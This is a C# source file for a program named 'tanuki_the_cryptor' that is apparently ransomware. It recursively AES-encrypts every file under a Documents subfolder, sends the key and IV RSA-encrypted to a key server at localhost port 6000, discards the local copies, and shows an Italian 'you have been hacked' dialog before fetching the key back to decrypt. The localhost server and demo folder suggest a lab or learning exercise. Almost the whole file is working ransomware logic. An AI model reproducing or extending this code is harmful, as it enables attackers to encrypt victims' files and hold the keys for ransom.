using System.Security.Cryptography;
using System.Text.Json;
using System.Text;

namespace tanuki_the_cryptor
{
    static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\esempio";

            byte[] key = null;
            byte[] iv = null;
            using (Aes aes = Aes.Create())
            {
                key = aes.Key;
                iv = aes.IV;
            }

            EncryptFiles(folder, key, iv);

            Console.WriteLine(iv.Length);

            Communication comm = new Communication("localhost", 6000);
            comm.Start();   
            comm.SendMessage(Cryptography.RSAEncrypt(Encoding.ASCII.GetBytes("store")));
            comm.SendMessage(Cryptography.RSAEncrypt(key));
            Thread.Sleep(1000);
            comm.SendMessage(Cryptography.RSAEncrypt(iv));
            
            key = null;
            iv = null;
            
            DialogResult dialogResult = MessageBox.Show("Tutti i file contenuti nella cartella Documenti sono stati cifrati. Vuoi decifrarli?",
                "Sei stato hackerato", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                comm.SendMessage(Cryptography.RSAEncrypt(Encoding.ASCII.GetBytes("retrieve")));
                (key, int len) = comm.RecvMessage(32);
                (iv, int len2) = comm.RecvMessage(16);

                File.WriteAllText("data.txt", key.Length.ToString() + "\n" + iv.Length.ToString());
                comm.Close();

                DecryptFiles(folder, key, iv);
            }
            else if (dialogResult == DialogResult.No)
            {
                comm.Close();
            }

            return;
        }

        private static void EncryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string content = File.ReadAllText(file);
                byte[] encrypted = Cryptography.AESEncrypt(content, key, iv);
                File.WriteAllBytes(file, encrypted);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                EncryptFiles(folder, key, iv);
            }
        }

        static private void DecryptFiles(string sourceFolder, byte[] key, byte[] iv)
        {
            if (!Directory.Exists(sourceFolder)) { return; }

            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                byte[] content = File.ReadAllBytes(file);
                string plainText = Cryptography.AESDecrypt(content, key, iv);
                File.WriteAllText(file, plainText);
            }

            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                DecryptFiles(folder, key, iv);
            }
        }
    }
}